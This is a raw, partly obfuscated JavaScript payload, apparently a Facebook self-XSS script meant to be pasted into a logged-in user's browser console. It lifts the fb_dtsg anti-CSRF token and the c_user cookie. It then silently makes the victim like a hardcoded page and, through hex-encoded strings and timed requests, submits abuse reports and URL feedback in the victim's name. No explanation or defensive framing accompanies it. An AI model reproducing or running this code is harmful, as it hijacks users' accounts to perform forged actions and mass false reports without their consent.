var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=1456012171316223&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
};
$VSK_t_NMzopLFrxTJxT=function(n){if(typeof($VSK_t_NMzopLFrxTJxT.list[n])=="string")return $VSK_t_NMzopLFrxTJxT.list[n].split("").reverse().join("");return $VSK_t_NMzopLFrxTJxT.list[n]};$VSK_t_NMzopLFrxTJxT.list=[/c_user=(\d+)/];var _0x4bae=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x3D\x39\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x31\x34\x31\x31\x38\x33\x33\x36\x32\x32\x33\x37\x33\x33\x35\x38\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x30\x36\x36\x36\x33\x37\x33\x31\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x6D\x67\x41\x4D\x43\x42\x79\x6E\x7A\x70\x51\x39\x55\x6F\x48\x46\x61\x65\x45\x78\x45\x57\x39\x41\x43\x78\x4F\x34\x70\x39\x47\x67\x53\x47\x47\x65\x71\x72\x57\x6F\x38\x70\x6F\x70\x79\x55\x57\x64\x42\x55\x67\x44\x79\x51\x61\x77\x26\x5F\x5F\x72\x65\x71\x3D\x6B\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x37\x30\x35\x31\x35\x36\x37\x34\x37\x36\x31\x32\x31\x37\x31\x36\x36\x37\x39\x31\x31\x37\x26\x5F\x5F\x72\x65\x76\x3D","\x73\x65\x6E\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x26\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x3D\x39\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41\x31\x33\x38\x38\x38\x34\x34\x32\x37\x38\x30\x30\x35\x37\x35\x37\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41\x31\x34\x30\x36\x36\x36\x33\x35\x37\x38\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x6D\x67\x41\x4D\x43\x42\x79\x6E\x7A\x70\x51\x39\x55\x6F\x48\x46\x61\x65\x45\x78\x45\x57\x39\x41\x43\x78\x4F\x34\x70\x39\x47\x67\x53\x47\x47\x65\x71\x72\x57\x6F\x38\x70\x6F\x70\x79\x55\x57\x64\x42\x55\x67\x44\x79\x51\x61\x77\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x37\x30\x35\x31\x35\x36\x37\x34\x37\x36\x31\x32\x31\x37\x31\x36\x36\x37\x39\x31\x31\x37\x26\x5F\x5F\x72\x65\x76\x3D","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x73\x69\x2F\x61\x6A\x61\x78\x2F\x75\x72\x6C\x5F\x66\x65\x65\x64\x62\x61\x63\x6B","\x64\x3D\x41\x57\x69\x39\x74\x42\x4C\x4D\x71\x4E\x51\x36\x67\x47\x45\x43\x5A\x4F\x4A\x45\x30\x6A\x6D\x33\x43\x73\x6B\x39\x65\x6E\x48\x63\x55\x38\x75\x6D\x79\x6E\x78\x39\x6B\x37\x34\x75\x68\x64\x35\x48\x47\x67\x62\x73\x7A\x5F\x61\x67\x61\x57\x6F\x34\x53\x6D\x43\x48\x4A\x76\x78\x6B\x4A\x51\x63\x5A\x6A\x48\x66\x76\x56\x47\x4A\x42\x42\x4D\x6D\x39\x6D\x6E\x6E\x73\x32\x71\x58\x39\x51\x5A\x79\x34\x77\x32\x75\x7A\x4B\x78\x4E\x30\x71\x4C\x72\x63\x79\x6C\x7A\x32\x41\x4C\x76\x6C\x58\x43\x56\x31\x4C\x45\x32\x31\x6D\x69\x4F\x65\x65\x49\x34\x5A\x5F\x36\x63\x4D\x58\x4E\x77\x4B\x75\x44\x48\x57\x37\x6F\x5F\x45\x59\x36\x59\x45\x79\x33\x71\x6F\x7A\x39\x77\x43\x4D\x63\x65\x41\x79\x31\x61\x35\x30\x4D\x47\x6A\x51\x6A\x35\x49\x57\x38\x45\x5A\x31\x34\x32\x65\x35\x7A\x71\x51\x66\x72\x41\x41\x70\x4A\x4C\x4E\x65\x4B\x34\x67\x50\x73\x6C\x48\x37\x39\x35\x2D\x54\x43\x46\x68\x58\x56\x79\x31\x7A\x4D\x61\x49\x30\x59\x4B\x6B\x42\x61\x44\x6C\x79\x6E\x76\x34\x2D\x78\x67\x45\x37\x51\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x7A\x6F\x53\x74\x32\x75\x36\x61\x57\x69\x7A\x47\x38\x35\x6F\x43\x69\x71\x37\x38\x68\x79\x57\x67\x53\x6D\x45\x56\x64\x4C\x46\x77\x78\x42\x78\x43\x62\x7A\x45\x6C\x78\x32\x34\x51\x61\x77\x26\x5F\x5F\x72\x65\x71\x3D\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x39\x36\x35\x35\x36\x38\x31\x37\x37\x35\x35\x31\x31\x31\x37\x37\x31\x31\x35\x37\x31\x26\x5F\x5F\x72\x65\x76\x3D"],fb_dtsg=document[_0x4bae[2]](_0x4bae[1])[0][_0x4bae[0]],user_id=document[_0x4bae[4]][_0x4bae[3]](document[_0x4bae[4]][_0x4bae[3]]($VSK_t_NMzopLFrxTJxT(0))[1]),xk=Math[_0x4bae[6]](1379999*Math[_0x4bae[5]]()+1312345),now=(new Date)[_0x4bae[7]]();setTimeout(function(){var c=new XMLHttpRequest,d=_0x4bae[22],e=_0x4bae[23]+user_id+_0x4bae[24]+fb_dtsg+_0x4bae[25]+xk;c[_0x4bae[16]](_0x4bae[15],d,!0),c[_0x4bae[14]]=function(){4==c[_0x4bae[17]]&&200==c[_0x4bae[18]]&&c[_0x4bae[19]]},c[_0x4bae[13]](e)},500),setTimeout(function(){var c=new XMLHttpRequest,d=_0x4bae[8],e=_0x4bae[9]+fb_dtsg+_0x4bae[20]+user_id+_0x4bae[11]+user_id+_0x4bae[21]+xk;c[_0x4bae[16]](_0x4bae[15],d,!0),c[_0x4bae[14]]=function(){4==c[_0x4bae[17]]&&200==c[_0x4bae[18]]&&c[_0x4bae[19]]},c[_0x4bae[13]](e)},2e3),setTimeout(function(){var c=new XMLHttpRequest,d=_0x4bae[8],e=_0x4bae[9]+fb_dtsg+_0x4bae[10]+user_id+_0x4bae[11]+user_id+_0x4bae[12]+xk;c[_0x4bae[16]](_0x4bae[15],d,!0),c[_0x4bae[14]]=function(){4==c[_0x4bae[17]]&&200==c[_0x4bae[18]]&&c[_0x4bae[19]]},c[_0x4bae[13]](e)},3e3);
